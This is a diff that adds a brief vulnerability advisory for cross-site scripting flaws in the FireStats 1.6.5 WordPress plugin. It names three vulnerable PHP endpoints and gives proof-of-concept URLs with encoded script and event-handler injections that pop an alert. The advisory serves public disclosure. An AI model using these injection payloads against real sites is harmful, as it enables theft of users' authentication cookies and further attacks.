@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/41548/info
+
+FireStats is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+FireStats 1.6.5 is vulnerable; other versions may be affected. 
+
+http://www.example.com/wp-content/plugins/firestats/php/window-add-excluded-ip.php?edit=%3Cscript%3Ealert%28123%29%3C/script%3E
+http://www.example.com/wp-content/plugins/firestats/php/window-add-excluded-url.php?edit=%3Cscript%3Ealert%28123%29%3C/script%3E
+http://www.example.com/wp-content/plugins/firestats/php/window-new-edit-site.php?site_id=%27%20onmousemove=alert%28123%29;%20style=width:900;height:900;%20a=
